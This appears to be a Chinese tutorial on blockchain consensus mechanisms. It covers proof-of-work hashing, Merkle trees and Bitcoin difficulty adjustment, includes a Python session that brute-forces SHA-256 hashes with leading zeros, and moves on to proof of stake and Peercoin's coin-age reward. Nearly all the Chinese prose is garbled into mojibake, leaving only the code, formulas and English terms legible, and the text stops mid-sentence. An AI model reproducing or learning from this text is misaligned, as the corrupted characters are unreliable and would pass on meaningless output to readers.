ä¸åŒçš„è™šæ‹Ÿè´§å¸é‡‡ç”¨ä¸åŒçš„å…±è¯†æœºåˆ¶ï¼Œå¸¸è§çš„å…±è¯†æœºåˆ¶å¦‚POWã€POSã€DPOSã€PBFTç­‰\nPoW POWï¼šProof of workï¼Œå·¥ä½œé‡è¯æ˜æœºåˆ¶\nPOWå·¥ä½œé‡è¯æ˜å°±æ˜¯æˆ‘ä»¬æ‰€ç†Ÿæ‚‰çš„æŒ–çŸ¿ï¼Œé€šè¿‡ä¸æˆ–è¿ç®—ï¼Œè®¡ç®—å‡ºä¸€ä¸ªæ»¡è¶³è§„åˆ™çš„éšæœºæ•°ï¼Œå³è·å¾—æœ¬æ¬¡è®°è´¦æƒï¼Œå‘å‡ºæœ¬è½®æ‰€éœ€è¦è®°å½•çš„æ•°æ®ï¼Œå…¨ç½‘å…¶ä»–èŠ‚ç‚¹éªŒè¯åä¸€èµ·å­˜å‚¨ã€‚è¿™ç§è¯æ˜æ–¹å¼çš„ä¸€ä¸ªæ˜¾è‘—ç‰¹å¾æ˜¯å¾€å¾€éœ€è¦å¾ˆå¤§çš„å·¥ä½œé‡æ‰èƒ½æ‹¿åˆ°æŒ‡å®šæˆæœï¼Œä½†æ˜¯è¿™ä¸ªæˆæœå¾ˆå®¹æ˜“éªŒè¯\nPOWå·¥ä½œé‡è¯æ˜çš„ä¸‰è¦ç´ ï¼šâ‘ å·¥ä½œé‡è¯æ˜å‡½æ•°\tâ‘¡Merkleæ ‘\tâ‘¢éš¾åº¦å€¼\nâ‘ å·¥ä½œé‡è¯æ˜å‡½æ•° 1.è¾“å…¥xå¯ä»¥æ˜¯ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸² 2.è¾“å‡ºç»“æœå³H(x)çš„é•¿åº¦æ˜¯å›ºå®šçš„ 3.è®¡ç®—H(x)çš„è¿‡ç¨‹æ˜¯é«˜æ•ˆçš„   å…ç¢°æ’   å‡½æ•°è¿˜éœ€è¦å…ç¢°æ’ï¼Œå³ä¸ä¼šå‡ºç° x â‰  y ï¼Œä½†æ˜¯ H(x)=H(y)ã€‚ä½†æ˜¯è¿™ä¸ªç‰¹ç‚¹åœ¨ç†è®ºä¸Šå¹¶ä¸æˆç«‹ï¼Œå¯¹äºSHA256ç®—æ³•ï¼Œä¼šæœ‰2^256ç§è¾“å‡ºï¼Œè¿›è¡Œ2^256+1æ¬¡è¾“å‡ºï¼Œé‚£ä¹ˆæ ¹æ®é¸½å·¢åŸç†ï¼Œä¸€å®šä¼šäº§ç”Ÿä¸€æ¬¡ç¢°æ’ã€‚\nä½†æ˜¯ä»æ¦‚ç‡çš„è§’åº¦çœ‹ï¼Œéšæœºç”ŸæˆKä¸ªæ•°ï¼Œä»–ä»¬ä¸åŒçš„æ¦‚ç‡ä¸º (N-1)/N Ã— (N-2)/N Ã— â€¦â€¦ Ã— (N-(k-2) )/N Ã— (N-(k-1))/N = e-k(k-1)/2N\nå› æ­¤ï¼Œç¢°æ’çš„æ¦‚ç‡ä¸º 1-e-k(k-1)/2N\nå› æ­¤ï¼Œä»æ¦‚ç‡çš„è§’åº¦çœ‹ï¼Œsha256è¿›è¡Œ2^130æ¬¡è¾“å…¥å°±ä¼šæœ‰99%çš„å¯èƒ½å‘ç”Ÿä¸€æ¬¡ç¢°æ’\nä¸è¿‡ï¼Œå‡è®¾ä¸€å°è®¡ç®—æœºä»¥æ¯ç§’10000æ¬¡çš„é€Ÿåº¦è¿›è¡Œå“ˆå¸Œè¿ç®—ï¼Œè¦ç»è¿‡10^27å¹´æ‰èƒ½å®Œæˆ2^128æ¬¡hashè¿ç®—\nå¦‚å›¾ä¸ºä¸åŒä½å‘ç”Ÿhashç¢°æ’çš„å¯èƒ½æ€§ï¼Œæœ€å³è¾¹æ˜¯å‘ç”Ÿhashç¢°æ’çš„å¯èƒ½æ€§ï¼Œå·¦è¾¹æ˜¯ç»è¿‡å¤šå°‘ä¸ªæ•°ä¹‹åå¯èƒ½è¾¾åˆ°å‘ç”Ÿçš„å¯èƒ½æ€§ã€‚\n  éšåŒ¿æ€§   å¯¹äºä¸€ä¸ªç»™å®šçš„è¾“å‡ºç»“æœH(x)ï¼Œæƒ³è¦é€†æ¨å‡ºè¾“å…¥xï¼Œåœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯èƒ½çš„ã€‚\nä¸å­˜åœ¨æ¯”ç©·ä¸¾æ›´å¥½çš„æ–¹æ³•ï¼Œå¯ä»¥ä½¿å“ˆå¸Œç»“æœH(x)è½åœ¨ç‰¹å®šèŒƒå›´ã€‚\nBlock Hash = hash(æœ¬é¡µå†…å®¹ï¼ŒPre Hashï¼Œæ—¶é—´æˆ³)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  \u003e\u003e\u003e import hashlib \u003e\u003e\u003e import re \u003e\u003e\u003e def s256(text): ... c = hashlib.sha256(text.encode('utf-8')) ... return text, c.hexdigest() ... \u003e\u003e\u003e s256('hacking') ('hacking','42d83a899f20aea7d53614d163ac6e90cf4143919324cee410dd767cf6225bbf') \u003e\u003e\u003e def cal(t, flag): ... pj = 0 ... ans = None ... while not None: ... s = t + str(pj) ... ans = re.match(flag, s256(s)[1]) ... if ans is None: ... print(pj) ... pj+=1 ... else: ... print(s256(s)) ... break \u003e\u003e\u003e \u003e\u003e\u003e \u003e\u003e\u003e flag = \"0{0}[a-f0-9]{64}\" \u003e\u003e\u003e cal(\"fuck\",flag) ('fuck0', '2096b072b572e7b3554ab62b542dee4136e4b3a0243be126918d035ec4a4a727') \u003e\u003e\u003e flag = \"0{1}[a-f0-9]{63}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck10', '03fc6bfae9f00fa966431f707507d7a18e201d81d564dba42b96b2a7988f3ca6') \u003e\u003e\u003e flag = \"0{2}[a-f0-9]{62}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck448','00ff7469c5332f8f5957f0acb1448d00fa4b2e281065f9202ea549a3a6ff7dba') \u003e\u003e\u003e flag = \"0{3}[a-f0-9]{61}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck7703', '0006086f65ce49afbd0479d1094463db1c7385aa1c1cd1ffedc1399404ee4fc9') \u003e\u003e\u003e flag = \"0{4}[a-f0-9]{60}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck263273', '000069e2e17d677804f76fb9b79b8f9d7654563a91a77a7d6c75ae30c6963e90') \u003e\u003e\u003e flag = \"0{5}[a-f0-9]{59}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck271481', '00000fa9aeacc3e986eaf8b8337d71c67abbd77acfd5cc8b90262f7377fdab7e') \u003e\u003e\u003e flag = \"0{6}[a-f0-9]{58}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck9197297', '000000c91683616ac0e361c2eafc66de0757e9d46f819e86d30d2cdae1df4398') \u003e\u003e\u003e flag = \"0{7}[a-f0-9]{57}\" \u003e\u003e\u003e cal(\"fuck\",flag) ......   â‘¡Merkleæ ‘ Merkleæ ‘ä¸€èˆ¬ç”¨äºå®Œæ•´æ€§éªŒè¯å¤„ç†ã€‚Merkleå“ˆå¸Œæ ‘æ˜¯ä¸€ç±»åŸºäºå“ˆå¸Œå€¼çš„äºŒå‰æ ‘æˆ–å¤šå‰æ ‘ï¼Œå…¶å­èŠ‚ç‚¹ä¸Šçš„å€¼é€šå¸¸ä¸ºæ•°æ®åº“çš„å“ˆå¸Œå€¼ï¼Œè€Œéå¶å­èŠ‚ç‚¹ä¸Šçš„å€¼è¯¥å°†è¯¥èŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹çš„ç»„åˆç»“æœçš„å“ˆå¸Œå€¼ã€‚å°†Merkle Rootå­˜å…¥åŒºå—å¤´é‡Œï¼ŒMerkle Tree å­˜å…¥åŒºå—ä½“é‡Œã€‚\nèŠ‚ç‚¹ç”Ÿæˆä¸€ç¬”ç­¹å¸äº¤æ˜“ï¼Œå¯¹äº4ä¸ªäº¤æ˜“è®°å½•L1ï¼ŒL2ï¼ŒL3ï¼ŒL4ï¼Œåˆ†åˆ«è®¡ç®—hash(L1)ï¼Œhash(L2)ï¼Œhash(L3)ï¼Œhash(L4)ï¼›å¯¹äºhash0=hash(hash0-0+hash0-1) å’Œ hash1=hash(hash1-0 + hash1-1)ï¼›è®¡ç®—å‡ºæ ¹èŠ‚ç‚¹çš„hashå€¼top hashï¼ŒtopHash=hash(hash0+hash1)ã€‚\nç„¶åå°†Merkleæ ‘rootçš„top hashå€¼å­˜å…¥åŒºå—é“¾å¤´ä¸­ï¼Œå¦‚ä¸‹å›¾\nåŒºå—é“¾ä¸­çš„Merkleæ ‘ä¸ºäºŒå‰æ ‘ï¼Œç”¨äºå­˜å‚¨äº¤æ˜“ä¿¡æ¯ã€‚æ¯ä¸ªäº¤æ˜“ä¸¤ä¸¤é…å¯¹ï¼Œæ„æˆMerkleæ ‘çš„å­èŠ‚ç‚¹ï¼Œè¿›è€Œç”Ÿæˆæ•´ä¸ªMerkleæ ‘ã€‚Merkleæ ‘ä½¿å¾—ç”¨æˆ·å¯ä»¥é€šè¿‡ä»åŒºå—å¤´å¾—åˆ°çš„Merkleæ ‘æ ¹å’Œåˆ«çš„ç”¨æˆ·æ‰€æä¾›çš„ä¸­é—´å“ˆå¸Œå€¼åˆ—è¡¨å»éªŒè¯æŸä¸ªäº¤æ˜“æ˜¯å¦åŒ…å«åœ¨åŒºå—ä¸­ã€‚æä¾›ä¸­é—´å“ˆå¸Œå€¼çš„ç”¨æˆ·å¹¶ä¸éœ€è¦æ˜¯å¯ä¿¡çš„ï¼Œå› ä¸ºä¼ªé€ åŒºå—å¤´çš„ä»£ä»·å¾ˆé«˜ï¼Œè€Œä¸­é—´å“ˆå¸Œå€¼å¦‚æœä¼ªé€ çš„è¯ä¼šå¯¼è‡´éªŒè¯å¤±è´¥ã€‚\nSPVï¼šç®€åŒ–æ”¯ä»˜éªŒè¯ï¼ˆSimplified Payment Verificationï¼‰ï¼Œè½»é’±åŒ…å¹¶ä¸ä¿å­˜å®Œæ•´çš„åŒºå—é“¾ï¼Œè€Œæ˜¯åªä¿å­˜æ¯ä¸€ä¸ªåŒºå—çš„åŒºå—å¤´ã€‚åŒºå—ä½“ä¿å­˜äº†å®Œæ•´çš„äº¤æ˜“ä¿¡æ¯ï¼Œè€Œäº¤æ˜“ä¿¡æ¯éœ€è¦çš„å­˜å‚¨é‡å¤§éƒ¨åˆ†éƒ½æ˜¯äº¤æ˜“å¤´çš„åƒå€ä»¥ä¸Šã€‚æ‰€ä»¥ï¼Œå¦‚æœåªä¿å­˜äº¤æ˜“å¤´ï¼Œå°±å¯ä»¥æå¤§çš„å‡å°‘æœ¬åœ°å®¢æˆ·ç«¯å­˜å‚¨çš„åŒºå—é“¾ä¿¡æ¯ã€‚\nåœ¨äº¤æ˜“æ—¶ï¼Œå‘å‡ºä¸€ä¸ªMerkleBlockæ¶ˆæ¯ï¼ŒåŒ…å«åŒºå—å¤´å’Œä¸€æ¡è¿æ¥ç›®æ ‡äº¤æ˜“ä¸Merkleæ ¹çš„Merkleè·¯å¾„\nè‹¥éœ€éªŒè¯è¯¥äº¤æ˜“ï¼Œå³å¯é€šè¿‡å…¶Merkleè·¯å¾„ä¸äº¤æ˜“hashç¡®å®šä¸€ä¸ªæ–°çš„Merkle Rootï¼Œå°†å…¶ä¸åŸrootç›¸æ¯”å³å¯ã€‚\n å‚è€ƒï¼š\nMerkle Tree å…¥é—¨\nå¯†ç å­¦â€”â€”Merkleæ ‘\n å‡å¦‚æœ‰äº¤æ˜“æ”¹å˜ï¼Œåˆ™æ•´ä¸ªæ ‘æä¼šå‘ç”Ÿæ”¹å˜\nå®šä½çš„æ—¶é—´ä¸ºO(log(n))ï¼Œå³äºŒå‰æ ‘çš„æŸ¥æ‰¾æ—¶é—´\nâ‘¢éš¾åº¦å€¼  æ–°éš¾åº¦å€¼ = æ—§éš¾åº¦å€¼ * ï¼ˆ20160åˆ†é’Ÿ / æœ€è¿‘çš„2016ä¸ªåŒºå—èŠ±è´¹çš„æ—¶é•¿ï¼‰  æ–°éš¾åº¦å€¼è§£æï¼šæ’‡å¼€å°±éš¾åº¦å€¼ï¼ŒæŒ‰æ¯”ç‰¹å¸ç†æƒ³å€¼æƒ…å†µæ¯10åˆ†é’Ÿå‡ºå—çš„é€Ÿåº¦ï¼Œè¿‡å»2016ä¸ªå—çš„æ€»èŠ±è´¹æ—¶é—´æ¥è¿‘20160åˆ†é’Ÿï¼Œè¿™æ ·ï¼Œè¿™ä¸ªå€¼æ°¸è¿œè¶‹äº1ã€‚\nè‹¥è¿‡å»2016ä¸ªåŒºå—èŠ±è´¹æ—¶é•¿å°‘äº20160åˆ†ï¼Œé‚£ä¹ˆè¿™ä¸ªç³»æ•°ä¼šå°äº1ï¼Œå¦åˆ™ï¼Œä¼šå¤§äº1ã€‚\néš¾åº¦å€¼è¶Šå¤§ï¼Œè¶Šéš¾æŒ–ã€‚å› ä¸º20160åˆ†å¤§çº¦ä¸º14å¤©ï¼Œè€Œæ¯”ç‰¹å¸ç½‘ç»œå¤§çº¦14å¤©è°ƒæ•´ä¸€æ¬¡éš¾åº¦å€¼ã€‚\næ¯”ç‰¹å¸çš„éš¾åº¦å’Œå‡ºå—é€Ÿåº¦å°†æˆåæ¯”ä¾‹é€‚å½“è°ƒæ•´å‡ºå—é€Ÿåº¦ã€‚\nç›®æ ‡å€¼ = æœ€å¤§ç›®æ ‡å€¼ / éš¾åº¦å€¼\næœ€å¤§ç›®æ ‡å€¼ï¼šä¸€ä¸ªå›ºå®šæ•°ï¼ˆæ’é‡ï¼Œåå…­è¿›åˆ¶å‰8ä½0åé¢56ä½1ï¼Œå³32bit0ï¼‰0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\nå³å‰N bitä¸º0\nç›®æ ‡å€¼è§£æï¼šè‹¥è¿‡å»2016ä¸ªåŒºå—èŠ±è´¹æ—¶é•¿å°‘äº20160åˆ†ï¼Œé‚£ä¹ˆéš¾åº¦å€¼ä¼šå˜å°ï¼Œç›®æ ‡å€¼å°†ä¼šè¢«è°ƒå°äº›ï¼›å¦åˆ™ï¼Œç›®æ ‡å€¼ä¼šè¢«è°ƒå¤§ã€‚\n æŸ¥æ‰¾å—çš„å¹³å‡æ—¶é—´å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼è®¡ç®—ï¼štime = difficulty * 2**32 / hashrate\néš¾åº¦å€¼ = time (s) * hashrate (hash / s ) / (2**32)\næ–°éš¾åº¦å€¼ / æ—§éš¾åº¦å€¼ = æ–°ç®—åŠ› / æ—§ç®—åŠ›\n  å¦‚æœéš¾åº¦ä¸º1çš„è¯ï¼Œå¤§çº¦æ˜¯æ¯ç§’é’Ÿ7 Mhashes\n  https://www.cnblogs.com/zhaoweiwei/p/difficulty.html\nhttps://en.bitcoin.it/wiki/Difficulty\n ä¾‹: è®¡ç®—ç›®æ ‡å€¼,5minäº§ç”Ÿä¸€ä¸ªåŒºå—,sha256ç®—æ³•,ç®—åŠ› 400M hash/s. ä¸€ä¸ªæ­£ç¡®åŒºå—è¢«è®¡ç®—,éœ€è¦è¿›è¡Œ (5*60)s * 400M hash/s = 120,000 M hash å‡å¦‚è®¡ç®—ä¸€ä¸ªåŒºå—å¤´éœ€è¦1M hash , åˆ™ è®¡ç®—æ­£ç¡®å¤´çš„å‡ ç‡ä¸º 1 / (2^17) ,(120000 â‰ˆ 2^17) æ‰€ä»¥, (2^(256-17)) / 2^256 == 1 / 2^17 æ‰€ä»¥, ç›®æ ‡å€¼ä¸º: 0b0â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦011â€¦â€¦ |-17bit0-||--(256-17)bit-- POWå·¥ä½œé‡è¯æ˜æµç¨‹ æµç¨‹å¦‚ä¸‹å›¾ï¼š\n ç”ŸæˆMerkleæ ¹å“ˆå¸Œ ç»„è£…åŒºå—å¤´ è®¡ç®—å‡ºå·¥ä½œé‡è¯æ˜çš„è¾“å‡º  ï¼ï¼ï¼ï¼šåŒºå—å¤´é‡Œçš„éšæœºæ•°å³æ˜¯nonce\n 1.å¦‚ä¸Š\n2.ç»„è£…åŒºå—å¤´ï¼šå—å¤´å°†è¢«ä½œä¸ºè®¡ç®—å‡ºå·¥ä½œé‡è¯æ˜è¾“å‡ºçš„ä¸€ä¸ªè¾“å…¥å‚æ•°ï¼Œå› æ­¤ç¬¬ä¸€éƒ¨è®¡ç®—å‡ºæ¥çš„Merkleæ ¹å“ˆå¸Œå’ŒåŒºå—å¤´çš„å…¶ä»–ç»„æˆéƒ¨åˆ†ç»„è£…æˆåŒºå—å¤´\n3.è®¡ç®—å‡ºå·¥ä½œé‡è¯æ˜çš„è¾“å‡ºï¼š\nâ€‹\ti) å·¥ä½œé‡è¯æ˜çš„è¾“å‡º = SHA256( SHA256(åŒºå—å¤´) )\nâ€‹\tii) if ï¼ˆå·¥ä½œé‡è¯æ˜çš„è¾“å‡º \u003c ç›®æ ‡å€¼ ï¼‰ï¼Œè¯æ˜å·¥ä½œé‡å®Œæˆ\nâ€‹\tiii) if ï¼ˆå·¥ä½œé‡è¯æ˜çš„è¾“å‡º \u003e= ç›®æ ‡å€¼ï¼‰ï¼Œå˜æ›´éšæœºæ•°(Nonce)ï¼Œé€’å½’ i çš„é€»è¾‘ï¼Œç»§ç»­ä¸ç›®æ ‡å€¼æ¯”å¯¹\n  å¯¹è¿™ä¸ªå€¼è¿›è¡Œä¸¤æ¬¡SHA256è¿ç®—ï¼Œä¸ºä»€ä¹ˆè¦ä¸¤æ¬¡ï¼Œè¿™æ˜¯å› ä¸ºSHA1åœ¨2017å¹´è¢«æ”»ç ´ï¼Œé‡‡ç”¨çš„æ–¹æ³•æ˜¯birthday collision attackã€‚ç¤¾åŒºè§‰å¾—SHA2è¢«æ”»ç ´ä¹Ÿæ˜¯æ—¶é—´çš„é—®é¢˜ï¼Œè€ŒæŠµå¾¡birthday collision attackçš„æœ‰æ•ˆæ–¹æ³•ä¸ºåŒé‡å“ˆå¸Œç®—æ³•ï¼Œå½“ç„¶è¿™ç§è¯´æ³•åªæ˜¯ç½‘ä¸Šä¼ è¨€ï¼Œæ²¡æœ‰å¾—åˆ°å…·ä½“ç¡®è®¤ã€‚       å®¢æˆ·ç«¯äº§ç”Ÿæ–°çš„äº¤æ˜“ï¼Œå‘å…¨ç½‘å¹¿æ’­\n  æ¯ä¸ªèŠ‚ç‚¹æ”¶åˆ°è¯·æ±‚ï¼Œå°†äº¤æ˜“çº³å…¥åŒºå—\n  æ¯ä¸ªèŠ‚ç‚¹é€šè¿‡powå·¥ä½œé‡è¯æ˜\n  å½“æŸä¸ªèŠ‚ç‚¹æ‰¾åˆ°äº†è¯æ˜ï¼Œå‘å…¨ç½‘å¹¿æ’­\n  å½“ä¸”ä»…å½“è¯¥åŒºå—çš„äº¤æ˜“æ˜¯æœ‰æ•ˆçš„ä¸”åœ¨ä¹‹å‰ä¸­æœªå­˜åœ¨çš„ï¼Œå…¶ä»–èŠ‚ç‚¹æ‰è®¤åŒè¯¥åŒºå—çš„æœ‰æ•ˆæ€§\n  æ¥å—è¯¥åŒºå—ä¸”åœ¨è¯¥åŒºå—çš„æœ«å°¾åˆ¶é€ æ–°çš„åŒºå—\n     èŠ‚ç‚¹æ€»æ˜¯è®¤ä¸ºæœ€é•¿çš„é“¾æ˜¯æ­£ç¡®çš„é“¾ï¼Œå¹¶è‡´åŠ›äºåœ¨æœ€é•¿çš„é“¾ä¸Šè¿›è¡Œæ‰©å±•ã€‚\n  å¦‚æœä¸¤ä¸ªèŠ‚ç‚¹åŒæ—¶å®ŒæˆPoWè¿‡ç¨‹å¹¶å¹¿æ’­äº†ä¸ä¸€æ ·çš„åŒºå—ï¼Œæœ‰çš„èŠ‚ç‚¹æ”¶åˆ°å…¶ä¸­ä¸€ä¸ªï¼Œè€Œæœ‰çš„èŠ‚ç‚¹å…ˆä¼šæ”¶åˆ°å¦ä¸€ä¸ªã€‚\n  è¿™ç§æƒ…å†µä¸‹ï¼Œé¦–å…ˆæ”¶åˆ°çš„åŒºå—ä¼šè¢«èŠ‚ç‚¹ä½œä¸ºä¸‹ä¸€ä¸ªåŒºå—æ·»åŠ åˆ°é“¾ä¸Šï¼ŒåŒæ—¶ä¹Ÿä¼šä¿å­˜ååˆ°çš„åŒºå—ã€‚\n  å½“ä¸‹ä¸€ä¸ªåŒºå—æ¥ä¸´æ—¶ï¼Œå°±ä¼šçŸ¥é“å“ªä¸€ä¸ªåŒºå—æ˜¯æ¯”è¾ƒé•¿çš„ï¼Œç„¶ååˆ‡æ¢åˆ°è¾ƒé•¿çš„åŒºå—é“¾ä¸Šã€‚\n   æ–°äº¤æ˜“çš„å¹¿æ’­ä¸ä¸€å®šè¦åˆ°è¾¾æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåªè¦åˆ°è¾¾è¶³å¤Ÿå¤šçš„èŠ‚ç‚¹ï¼Œè¿™äº›èŠ‚ç‚¹å°±ä¼šåœ¨ä¸€å®šæ—¶é—´å†…å°†äº¤æ˜“æ‰“åŒ…åˆ°åŒºå—ä¸­ åŒºå—çš„å¹¿æ’­ä¹Ÿæ˜¯å…è®¸ä¸¢åŒ…çš„ï¼Œå¦‚æœèŠ‚ç‚¹æ²¡æœ‰æ”¶åˆ°æŸä¸€ä¸ªåŒºå—ï¼Œå½“ä¸‹ä¸€ä¸ªåŒºå—åˆ°æ¥æ—¶ï¼Œè¯¥èŠ‚ç‚¹å‘ç°æ–°åŒºå—çš„prevHashä¸æ˜¯ç›®å‰æœ€åä¸€ä¸ªåŒºå—ï¼Œå°±ä¼šå»è¯·æ±‚ä¸¢å¤±çš„åŒºå— å› ä¸ºåšå‡ºå·¥ä½œé‡è¯æ˜çš„èŠ‚ç‚¹ä¸Šæ²¡æœ‰æœªå»ºå—çš„äº¤æ˜“ï¼Œä»è€Œæœ‰å¯èƒ½äº§ç”Ÿç©ºå—  POWçš„ä¼˜ç¼ºç‚¹  **ä¼˜ç‚¹ï¼š**å®Œå…¨å»ä¸­å¿ƒåŒ–ï¼ŒèŠ‚ç‚¹è‡ªç”±è¿›å‡º **ç¼ºç‚¹ï¼š**ç›®å‰bitcoinå·²ç»å¸å¼•äº†å…¨çƒå¤§éƒ¨åˆ†çš„ç®—åŠ›ï¼Œå…¶ä»–å†ç”¨POWå…±è¯†æœºåˆ¶çš„åŒºå—é“¾åº”ç”¨å¾ˆéš¾è·å¾—ç›¸åŒç®—åŠ›æ¥ä¿éšœè‡ªèº«çš„å®‰å…¨ï¼›æŒ–çŸ¿é€ æˆå¤§é‡çš„èµ„æºæµªè´¹ï¼›å…±è¯†è¾¾æˆçš„å‘¨æœŸè¾ƒé•¿ï¼Œä¸é€‚åˆå•†ä¸šåº”ç”¨  POS POSï¼šæƒç›Šè¯æ˜æœºåˆ¶ï¼ˆProof of Stakeï¼‰ï¼Œæ˜¯Powçš„ä¸€ç§å‡çº§å…±è¯†æœºåˆ¶ï¼Œæ ¹æ®æ¯ä¸ªèŠ‚ç‚¹æ‰€å ä»£å¸çš„æ¯”ä¾‹å’Œæ—¶é—´ï¼Œç­‰æ¯”ä¾‹çš„é™ä½æŒ–çŸ¿éš¾åº¦ï¼Œä»è€ŒåŠ å¿«æ‰¾åˆ°éšæœºæ•°çš„é€Ÿåº¦ã€‚\nè‹¥Powä¸»è¦æ¯”æ‹¼çš„æ˜¯ç®—åŠ›ï¼Œé‚£ä¹ˆPosåˆ™æ˜¯æ¯”æ‹¼ä½™é¢ã€‚é€šä¿—è¯´å°±æ˜¯å½“æ‰‹é‡Œçš„å¸è¶Šå¤šï¼ŒæŒ–åˆ°ä¸€ä¸ªå—çš„æ¦‚ç‡è¶Šå¤§\nPOSåˆæ ¼åŒºå—å¯ä»¥è¡¨è¿°ä¸ºï¼šF(Timestamp) = Target * Balanceï¼Œä¸POWçš„F(Nonce) \u003c Target  ç›¸æ¯”ï¼Œå¼å­å·¦è¾¹çš„æœç´¢ç©ºé—´ç”±Nonce å˜æˆ Timestampï¼ŒNonceå€¼åŸŸæ˜¯æ— é™çš„ï¼Œè€ŒTimestampçš„å€¼åŸŸæ˜¯æå…¶æœ‰é™çš„ï¼Œä¸€ä¸ªåˆæ ¼çš„åŒºå—æ—¶é—´å¿…é¡»åœ¨å‰ä¸€ä¸ªåŒºå—æ—¶é—´çš„è§„å®šèŒƒå›´ä¹‹å†…ï¼Œæ—¶é—´å¤ªæ—©æˆ–è€…å¤ªè¶…å‰çš„åŒºå—éƒ½ä¸ä¼šè¢«å…¶ä»–èŠ‚ç‚¹æ¥çº³ã€‚å¼å­å³è¾¹çš„ç›®æ ‡å€¼å¼•å…¥ä¸€ä¸ªä¹˜ç§¯å› å­ä½™é¢ï¼Œè¯¾ä»¶ä½™é¢è¶Šå¤§ï¼Œæ•´ä½“ç›®æ ‡å€¼ï¼ˆTarget*Balanceï¼‰è¶Šå¤§ï¼Œè¶Šå®¹æ˜“æ‰¾åˆ°ä¸€ä¸ªåŒºå—ã€‚å› ä¸ºTimestamp æœ‰é™ï¼ŒPOSé“¸é€ åŒºå—æˆåŠŸç‡ä¸»è¦ä¸Balanceæœ‰å…³ã€‚\nPeercoinï¼ˆPPCï¼‰ PPCæ˜¯POSçš„ä¸€ç§å…·ä½“çš„å®ç°æ–¹å¼\nâ€‹\tPPCæ˜¯ä»ä¸­æœ¬èªæ‰€åˆ›é€ çš„BTCè¡ç”Ÿå‡ºæ¥çš„ä¸€ç§P2Pçš„ç”µå­å¯†ç è´§å¸ï¼Œä»¥æƒç›Šè¯æ˜ï¼ˆProof of Stakeï¼Œä»¥ä¸‹ç®€ç§°PoSï¼‰å–ä»£å·¥ä½œé‡è¯æ˜ï¼ˆProof of Workï¼Œä»¥ä¸‹ç®€ç§°PoWï¼‰æ¥ç»´æŠ¤ç½‘ç»œå®‰å…¨ã€‚åœ¨è¿™ç§æ··åˆè®¾è®¡ä¸­ï¼ŒPoWä¸»è¦åœ¨æœ€åˆçš„é‡‡çŸ¿é˜¶æ®µèµ·ä½œç”¨ã€‚é•¿è¿œæ¥çœ‹ï¼ŒPPCç½‘ç»œçš„å®‰å…¨å¹¶ä¸ä¾èµ–èƒ½æºçš„æ¶ˆè€—ã€‚å› æ­¤PPCæ˜¯ä¸€ç§èŠ‚èƒ½è€Œæœ‰æˆæœ¬ä¼˜åŠ¿çš„P2Pç”µå­å¯†ç è´§å¸ã€‚\nâ€‹\tPoSæ˜¯åŸºäºå¸é¾„(coin age)å¹¶ç”±é€šè¿‡ä¸ BTCç±»ä¼¼çš„ç”±æ¯ä¸ªèŠ‚ç‚¹æ•£åˆ—è¿ç®—äº§ç”Ÿçš„ï¼Œåªæ˜¯å…¶æœç´¢ç©ºé—´è¢«é™åˆ¶äº†ã€‚åŒºå—é“¾çš„å†å²åŠäº¤æ˜“ç»“ç®—æ˜¯é€šè¿‡ä¸€ä¸ªä¸­å¿ƒåŒ–å¹¿æ’­æ£€æŸ¥æœºåˆ¶å¾—åˆ°è¿›ä¸€æ­¥ä¿æŠ¤ã€‚\nâ€‹\tè¦æŒæ¡Peercoinçš„POSæœºåˆ¶ï¼Œéœ€è¦é‡ç‚¹ç†è§£Sunny Kingä¸“é—¨ä¸ºPPCè®¾è®¡çš„å‡ ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼š\n  Coinage å¸é¾„ï¼Œä¹Ÿå«å¸å¤©ã€‚å‡å¦‚1.5ä¸ªå¸å­˜åœ¨äºåŒºå—é“¾ä¸­10å¤©ï¼Œå¸é¾„æ•°å€¼ä¸ºï¼šCoinage = 1.5 * 10 = 15\nPPCé‡‡ç”¨å¸é¾„ï¼Œè€Œä¸æ˜¯ç›´æ¥é‡‡ç”¨ä½™é¢ï¼ˆBalanceï¼‰æ¥è®¡ç®—ã€‚ä¸€ä¸ªUTXO(æœªèŠ±è´¹çš„äº¤æ˜“è¾“å‡º)ä¸€æ—¦è¢«èŠ±è´¹ï¼Œå…¶å¸é¾„è¢«æ¸…é›¶ï¼Œæ–°çš„UTXOå¸é¾„ä»0å¼€å§‹ç®—èµ·\n  stakeReward æƒç›Šæ¿€åŠ±ï¼Œä¿—ç§°è·å¾—åˆ©æ¯ï¼Œè®¡ç®—å…¬å¼å¦‚ä¸‹ï¼šstakeReward = nCoinAge*33/(365*33+8)*0.01*COINï¼Œ\nå…¬å¼å¯ç®€åŒ–æœªï¼šstakeReward = (0.01 * nCoinAge /365) * COIN\nå…¶ä¸­ï¼ŒnCoinAgeæ˜¯CoinStakeæ‰€æœ‰è¾“å…¥çš„å¸é¾„æ€»å’Œï¼Œç”±å…¬å¼å¯çŸ¥æ”¶ç›ŠæŒ‰1%å¹´ç‡è®¡ç®—ã€‚ç†æƒ³çŠ¶æ€ä¸‹ï¼Œå‡è®¾æ‰€æœ‰çš„å¸å…¨å¹´éƒ½å‚ä¸æŒ–çŸ¿ï¼Œä»£å¸æ€»é‡æ¯å¹´æœ‰1%é€šèƒ€ç‡ï¼Œè¿™ä¸€è®¾è®¡ä¸ºå¾ˆå¤šäººæ‰€è¯Ÿç—…ï¼Œè€Œä¸”ï¼Œè¿™ä¸€è®¾è®¡å¹¶ä¸èƒ½æ¿€åŠ±çŸ¿å·¥ç§¯æå‚ä¸æŒ–çŸ¿ä»¥ç»´æŠ¤åŒºå—é“¾çš„å®‰å…¨ï¼Œå› 